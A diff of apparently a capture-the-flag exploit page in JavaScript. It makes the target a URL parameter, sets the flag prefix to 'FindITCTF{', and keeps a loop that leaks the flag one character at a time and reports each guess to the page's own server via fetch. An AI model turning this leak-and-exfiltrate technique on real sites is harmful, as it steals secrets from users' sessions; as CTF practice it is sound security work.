@@ -5,7 +5,7 @@
         <input type="text" name="content">
     </form>
     <script>
-        const TARGET = "https://localhost:8080"
+        const TARGET = (new URLSearchParams(location.search).get("target") || "").replace(/\/$/, "")
         const form = document.querySelector("form")
         const input = document.querySelector("input")
         const redirectedUrl = `${location.origin}/set-referer`
@@ -49,7 +49,7 @@
             throw Error("char not found!")
         }
         async function main(){
-            var known = "FINDIT{"
+            var known = "FindITCTF{"
             while (known[known.length-1] != "}"){
                 known = await leak(known)
                 fetch(`/?flag=${known}`)
